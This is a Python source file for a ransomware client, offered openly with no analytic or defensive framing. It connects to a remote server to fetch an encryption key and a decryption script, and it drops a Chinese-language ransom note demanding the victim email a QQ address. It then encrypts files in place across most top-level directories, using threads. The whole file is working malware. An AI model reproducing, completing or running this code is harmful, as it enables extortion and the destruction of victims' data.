# coding=gbk
from cryptography.fernet import Fernet
import socket,os,random,time,threading

class Clientencryption():

    def main(self):
        global public_key
        public_key = self.ClientConnect()
        kgloryhacker = open("Kglory给你的一封信.txt","a+")
        kgloryhacker.write("你电脑文件已经给我勒索了,你现在需要联系1956691299@qq.com,发送内容为中国牛逼和当前目录下的解密脚本"+str(userrandom)+"名字.然后等待回复,我会发送解密密钥给你^^，收到密钥你需要使用解密脚本("+str(userrandom)+".py)进行解密.")
        kgloryhacker.close()
        drive = self.check_drive()
        self.start(drive)

    def check_folder(self,x):
        for filetype in x:
            try:
                if(os.path.isfile(filetype)):
                    Thread = threading.Thread(target=self.module_combination,args=(os.path.abspath(filetype),))
                    Thread.start()
                elif(os.path.isdir(filetype)):
                    file = os.path.abspath(filetype)
                    files = os.listdir(file)
                    for x in range(len(files)):
                        files[x] = os.path.abspath(file+"/"+files[x])
                    self.check_folder(files)
            except:
                pass
            
    def check_drive(self):
        dictionary = os.popen("ls /").read().strip("\n").split("\n")
        lists = []
        for x in dictionary:
            filecheck = os.path.isdir("/"+x)
            filenames = "/"+x
            if(filecheck and filenames != "/bin" and filenames !="/sbin" and filenames != "/usr" and filenames != "/etc"):
                lists.append("/"+x)
        return lists
    
    def start(self,data):
        for x in data:
            try:
                files = os.listdir(x)
                for j in range(len(files)):
                    files[j] =  x+"/"+files[j]
                Thread = threading.Thread(target=self.check_folder,args=(files,))
                Thread.start()
            except:
                pass
            
    def module_combination(self,filedata):
        cipher = Fernet(public_key)
        if("Kglory.py" in filedata or userrandomfile in filedata or "给你的一封信.txt" in filedata):
            pass
        else:
            try:
                fileopen = open(filedata,"rb")
                fileread = fileopen.read()
                encrypted = cipher.encrypt(fileread)
                fileopen.close()
                fileopen = open(filedata,"wb")
                fileopen.write(encrypted)
                fileopen.close()
            except:
                pass
            
    def ClientConnect(self):
        Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Socket.connect((str(ip),int(port)))
        global userrandom,userrandomfile
        userrandom = random.randint(100000,999999)
        userrandomfile = str(userrandom)+".py"
        Socket.send(bytes(str(userrandom).encode("UTF-8")))
        while True:
            public_key = Socket.recv(1024)
            decryptedfile = open(str(userrandom)+".py","w+b")
            decryptedfiledata = Socket.recv(3072)
            decryptedfile.write(decryptedfiledata)
            decryptedfile.close()
            return public_key
